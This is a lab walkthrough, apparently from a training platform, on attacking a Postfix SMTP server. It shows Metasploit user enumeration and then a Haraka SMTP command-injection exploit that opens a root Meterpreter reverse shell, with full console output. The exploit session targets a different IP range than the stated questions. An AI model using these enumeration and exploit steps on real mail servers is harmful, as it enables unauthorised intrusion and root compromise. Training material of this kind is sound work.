In this challenge we will look at the basics of Postfix SMTP server reconnaissance. Please start the lab and answer the following questions:

Questions

1. What is the SMTP server name and banner.
2. Connect to SMTP service using netcat and retrieve the hostname of the server (domain name).
3. Does user “admin” exist on the server machine? Connect to SMTP service using netcat and check manually.
4. Does user “commander” exist on the server machine? Connect to SMTP service using netcat and check manually.
5. What commands can be used to check the supported commands/capabilities? Connect to SMTP service using telnet and check.
6. How many of the common usernames present in the dictionary /usr/share/commix/src/txt/usernames.txt exist on the server. Use smtp-user-enum tool for this task.
7. How many common usernames present in the dictionary /usr/share/metasploit-framework/data/wordlists/unix_users.txt exist on the server. Use suitable metasploit module for this task.
8. Connect to SMTP service using telnet and send a fake mail to root user.
9. Send a fake mail to root user using sendemail command.

Instructions: 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
- The Target machine should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
14737: eth0@if14738: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.3/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
14740: eth1@if14741: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:c6:0f:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.198.15.2/24 brd 192.198.15.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~# msfconsole
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v5.0.18-dev                          ]
+ -- --=[ 1882 exploits - 1062 auxiliary - 328 post       ]
+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 > search type:auxiliary name:portscan
msf5 > workspace smtp_enum 
[*] Workspace: smtp_enum
msf5 > setg rhosts 192.198.15.3
rhosts => 192.198.15.3
msf5 > search type:auxiliary name:smtp

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   1  auxiliary/client/smtp/emailer                             normal  No     Generic Emailer (SMTP)
   2  auxiliary/dos/smtp/sendmail_prescan      2003-09-17       normal  No     Sendmail SMTP Address prescan Memory Corruption
   3  auxiliary/fuzzers/smtp/smtp_fuzzer                        normal  Yes    SMTP Simple Fuzzer
   4  auxiliary/scanner/smtp/smtp_enum                          normal  Yes    SMTP User Enumeration Utility
   5  auxiliary/scanner/smtp/smtp_ntlm_domain                   normal  Yes    SMTP NTLM Domain Extraction
   6  auxiliary/scanner/smtp/smtp_relay                         normal  Yes    SMTP Open Relay Detection
   7  auxiliary/scanner/smtp/smtp_version                       normal  Yes    SMTP Banner Grabber
   8  auxiliary/server/capture/smtp                             normal  No     Authentication Capture: SMTP


msf5 > use auxiliary/scanner/smtp/smtp_version
msf5 auxiliary(scanner/smtp/smtp_version) > run

[+] 192.198.15.3:25       - 192.198.15.3:25 SMTP 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.\x0d\x0a
[*] 192.198.15.3:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smtp/smtp_version) > use auxiliary/scanner/smtp/smtp_enum
msf5 auxiliary(scanner/smtp/smtp_enum) > options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                                Required  Description
   ----       ---------------                                                --------  -----------
   RHOSTS     192.198.15.3                                                   yes       The target address range or CIDR identifier
   RPORT      25                                                             yes       The target port (TCP)
   THREADS    1                                                              yes       The number of concurrent threads
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.

msf5 auxiliary(scanner/smtp/smtp_enum) > run

[*] 192.198.15.3:25       - 192.198.15.3:25 Banner: 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
[+] 192.198.15.3:25       - 192.198.15.3:25 Users found: , admin, administrator, backup, bin, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, postmaster, proxy, sync, sys, uucp, www-data
[*] 192.198.15.3:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smtp/smtp_enum) > 
```

```
msf5 > search type:exploit name:smtp

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                    ---------------  ----       -----  -----------
   1  exploit/linux/smtp/haraka                               2017-01-26       excellent  Yes    Haraka SMTP Command Injection
   2  exploit/unix/smtp/qmail_bash_env_exec                   2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
   3  exploit/unix/webapp/squirrelmail_pgp_plugin             2007-07-09       manual     No     SquirrelMail PGP Plugin Command Execution (SMTP)
   4  exploit/windows/browser/communicrypt_mail_activex       2010-05-19       great      No     CommuniCrypt Mail 1.16 SMTP ActiveX Stack Buffer Overflow
   5  exploit/windows/email/ms07_017_ani_loadimage_chunksize  2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)
   6  exploit/windows/smtp/mailcarrier_smtp_ehlo              2004-10-26       good       Yes    TABS MailCarrier v2.51 SMTP EHLO Overflow
   7  exploit/windows/smtp/mercury_cram_md5                   2007-08-18       great      No     Mercury Mail SMTP AUTH CRAM-MD5 Buffer Overflow
   8  exploit/windows/smtp/njstar_smtp_bof                    2011-10-31       normal     Yes    NJStar Communicator 3.00 MiniSMTP Buffer Overflow
   9  exploit/windows/smtp/sysgauge_client_bof                2017-02-28       normal     No     SysGauge SMTP Validation Buffer Overflow


msf5 > use exploit/linux/smtp/haraka
msf5 exploit(linux/smtp/haraka) > options

Module options (exploit/linux/smtp/haraka):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT     8080             yes       The local port to listen on.
   SSL         false            no        Negotiate SSL for incoming connections
   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                      no        The URI to use for this exploit (default is random)
   email_from  foo@example.com  yes       Address to send from
   email_to    admin@localhost  yes       Email to send to, must be accepted by the server
   rhost       192.71.123.3     yes       Target server
   rport       25               yes       Target server port


Exploit target:

   Id  Name
   --  ----
   0   linux x64


msf5 exploit(linux/smtp/haraka) > set SRVPORT 9898
SRVPORT => 9898
msf5 exploit(linux/smtp/haraka) > set email_to root@attackdefense.test
email_to => root@attackdefense.test
msf5 exploit(linux/smtp/haraka) > set payload linux/x64/meterpreter_reverse_http
payload => linux/x64/meterpreter_reverse_http
msf5 exploit(linux/smtp/haraka) > options

Module options (exploit/linux/smtp/haraka):

   Name        Current Setting          Required  Description
   ----        ---------------          --------  -----------
   SRVHOST     0.0.0.0                  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT     9898                     yes       The local port to listen on.
   SSL         false                    no        Negotiate SSL for incoming connections
   SSLCert                              no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                              no        The URI to use for this exploit (default is random)
   email_from  foo@example.com          yes       Address to send from
   email_to    root@attackdefense.test  yes       Email to send to, must be accepted by the server
   rhost       192.71.123.3             yes       Target server
   rport       25                       yes       Target server port


Payload options (linux/x64/meterpreter_reverse_http):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local listener hostname
   LPORT  8080             yes       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   linux x64


msf5 exploit(linux/smtp/haraka) > set lhost eth1
lhost => 192.71.123.2
msf5 exploit(linux/smtp/haraka) > run

[*] Started HTTP reverse handler on http://192.71.123.2:8080
[*] Exploiting...
[*] Using URL: http://0.0.0.0:9898/CnndsLx
[*] Local IP: http://10.1.0.3:9898/CnndsLx
[*] Sending mail to target server...
[*] Client 192.71.123.3 (Wget/1.17.1 (linux-gnu)) requested /CnndsLx
[*] Sending payload to 192.71.123.3 (Wget/1.17.1 (linux-gnu))
[*] http://192.71.123.2:8080 handling request from 192.71.123.3; (UUID: xhuegkwu) Redirecting stageless connection from /mrg_MNsbMpF1UXNTEZq7Hgi6WEgBYx47ltNThpajcnsvRNpD0NpPTEE8-ccv5x_OaOLXvKZXiKBRTqV3tnGqMv2SLR_20yyEMQ5dgn0STrCWaCZdFYOutl with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] http://192.71.123.2:8080 handling request from 192.71.123.3; (UUID: xhuegkwu) Attaching orphaned/stageless session...
[*] Meterpreter session 1 opened (192.71.123.2:8080 -> 192.71.123.3:32992) at 2023-08-03 15:57:03 +0000
[+] Triggered bug in target server (plugin timeout)
[*] Command Stager progress - 100.00% done (112/112 bytes)
[*] Server stopped.

meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > sysinfo
Computer     : 192.71.123.3
OS           : Ubuntu 16.04 (Linux 5.4.0-153-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter >
```
